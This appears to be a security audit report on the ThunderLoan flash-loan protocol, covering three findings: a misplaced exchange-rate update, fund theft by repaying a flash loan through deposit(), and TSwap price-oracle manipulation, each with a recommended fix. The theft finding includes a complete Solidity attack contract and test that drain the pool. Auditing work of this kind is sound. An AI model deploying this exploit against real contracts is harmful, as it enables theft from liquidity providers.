## High

### [H-1] Erroneous 'ThunderLoan::updateExchangeRate' in the 'deposit' function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate.

**Description:** In the ThunderLoan system, the 'exhangeRate' is responsible for calculating the exchange rate between assetTokens and underlying tokens. In a way, it`s responsible for keeping track of how many fees to give to liqudity providers.

However, the 'deposit' function, updates this rate, without collecting any fees! This update should be removed.

```javascript

    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
        uint256 calculatedFee = getCalculatedFee(token, amount);
        assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }

```

**Impact:** There are several impacts to this bug.

1. The 'redeem' function is blocked, because the protocol thinks the owed tokens is more than it has.
2. Rewards are incorrectly calculated,leading to liquidity providers potentially getting way more or less than deserved.

**Proof of Concept:**

1.  LP deposits.
2.  User takes out a flash loan.
3.  It is now impossible for LP to redeem.
    <details>
    <summary> Proof of Code</summary>

    Place the following into 'ThunderLoanTest.t.sol'

    ```javascript
           function testRedeemAfterLoan() public setAllowedToken hasDeposits {
            uint256 amountToBorrow = AMOUNT * 10;
            uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

            vm.startPrank(user);
            tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
            thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
            vm.stopPrank();

            uint256 amountToRedeem = type(uint256).max;
            vm.startPrank(liquidityProvider);
            thunderLoan.redeem(tokenA, amountToRedeem);
    ```

</details>

**Recommended Mitigation:** Remove the incorrectly updated exchange rate lines form 'deposit'

```diff
       function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }

```

### [H-2] All the funds can be stolen if the flash loan is returned using deposit()

**Description:** The flashloan() performs a crucial balance check to ensure that the ending balance, after the flash loan, exceeds the initial balance, accounting for any borrower fees. This verification is achieved by comparing endingBalance with startingBalance + fee. However, a vulnerability emerges when calculating endingBalance using token.balanceOf(address(assetToken)).

Exploiting this vulnerability, an attacker can return the flash loan using the deposit() instead of repay(). This action allows the attacker to mint AssetToken and subsequently redeem it using redeem(). What makes this possible is the apparent increase in the Asset contract's balance, even though it resulted from the use of the incorrect function. Consequently, the flash loan doesn't trigger a revert.

**Impact:** All the funds of the AssetContract can be stolen.

**Proof of Concept:** To execute the test successfully, please complete the following steps:

1. Place the **`attack.sol`** file within the mocks folder.
1. Import the contract in **`ThunderLoanTest.t.sol`**.
1. Add **`testattack()`** function in **`ThunderLoanTest.t.sol`**.
1. Change the **`setUp()`** function in **`ThunderLoanTest.t.sol`**.

```Solidity
import { Attack } from "../mocks/attack.sol";
```

```Solidity
function testattack() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        vm.startPrank(user);
        tokenA.mint(address(attack), AMOUNT);
        thunderLoan.flashloan(address(attack), tokenA, amountToBorrow, "");
        attack.sendAssetToken(address(thunderLoan.getAssetFromToken(tokenA)));
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();

        assertLt(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA))), DEPOSIT_AMOUNT);
    }
```

```Solidity
function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
        vm.prank(user);
        attack = new Attack(address(thunderLoan));
    }
```

attack.sol

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";

interface IThunderLoan {
    function repay(address token, uint256 amount) external;
    function deposit(IERC20 token, uint256 amount) external;
    function getAssetFromToken(IERC20 token) external;
}


contract Attack {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));

        if (initiator != s_owner) {
            revert MockFlashLoanReceiver__onlyOwner();
        }

        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        IERC20(token).approve(s_thunderLoan, amount + fee);
        IThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);
        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }

    function sendAssetToken(address assetToken) public {

        IERC20(assetToken).transfer(msg.sender, IERC20(assetToken).balanceOf(address(this)));
    }
}
```

Notice that the **`assetLt()`** checks whether the balance of the AssetToken contract is less than the **`DEPOSIT_AMOUNT`**, which represents the initial balance. The contract balance should never decrease after a flash loan, it should always be higher.

**Recommended Mitigation:** Add a check in deposit() to make it impossible to use it in the same block of the flash loan. For example registring the block.number in a variable in flashloan() and checking it in deposit().

## Medium

### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attack

**Description:** The TSwap protocol is a constant product formula based on AMM(automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious user to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:** Liquidity providers will drastically reduced fees for providing liquidity.

**Proof of Concept:**
The following all happens in 1 transaction.

1. User takes a flash loan from 'ThunderLoan' for 1000 'tokenA'. They are charged the original fee 'fee1'. During the flash loan, they do the following;
   1. User sells 1000 'fee1', tanking the price.
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 'tokenA'. 4. Due to the fact that the way 'ThunderLoan' calculates price based on the 'TSwapPool' this second flash loan is substantially cheaper.

```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
        return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```

2. The user then repays the first flash loan, and then repays the second flash loan.

**Recommended Mitigation:** Consider using a different price mechanism, like a Chanlink price feed with a Uniswap TWAP fallback oracle.
